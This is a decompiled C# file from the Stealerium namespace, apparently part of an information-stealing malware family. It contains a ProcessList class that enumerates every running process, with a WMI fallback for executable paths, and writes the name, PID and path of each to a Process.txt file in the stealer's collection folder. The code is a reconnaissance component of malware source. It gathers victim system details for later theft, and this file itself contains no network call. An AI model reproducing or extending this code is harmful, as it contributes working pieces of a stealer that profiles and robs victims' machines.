using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace Stealerium.Target.System;

internal sealed class ProcessList
{
	public static void WriteProcesses(string sSavePath)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			File.AppendAllText(sSavePath + "\\Process.txt", "NAME: " + process.ProcessName + "\n\tPID: " + process.Id + "\n\tEXE: " + ProcessExecutablePath(process) + "\n\n");
		}
	}

	public static string ProcessExecutablePath(Process process)
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (process.MainModule != null)
			{
				return process.MainModule!.FileName;
			}
		}
		catch
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT ExecutablePath, ProcessID FROM Win32_Process").Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.get_Current();
					object obj = ((ManagementBaseObject)val).get_Item("ProcessID");
					object obj2 = ((ManagementBaseObject)val).get_Item("ExecutablePath");
					if (obj2 != null && obj.ToString() == process.Id.ToString())
					{
						return obj2.ToString();
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		return "";
	}
}
